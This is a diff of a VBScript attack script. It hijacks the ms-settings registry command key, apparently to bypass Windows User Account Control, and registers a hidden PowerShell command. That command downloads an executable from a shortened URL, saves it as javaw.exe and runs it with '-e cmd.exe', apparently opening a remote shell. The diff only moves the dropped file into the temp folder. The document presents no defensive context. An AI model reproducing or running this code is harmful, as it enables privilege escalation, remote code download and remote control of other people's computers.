@@ -6,7 +6,7 @@ Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
 Const DelegateExecRegKeyName = "DelegateExecute"
 Const DelegateExecRegKeyValue = ""
 Const DefaultRegKeyName = ""
-Const DefaultRegKeyValue = "cmd.exe /c powershell.exe -nop -w hidden -outf C:\\Windows\\System32\\javaw.exe https://is.gd/onorum & C:\\Windows\\System32\\javaw.exe -e cmd.exe"
+Const DefaultRegKeyValue = "cmd.exe /c powershell.exe -nop -w hidden -outf %tmp%\\javaw.exe https://is.gd/onorum & %tmp%\\javaw.exe -e cmd.exe"
 
 Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
 Set Registry = GetObject(RegObjectPath)
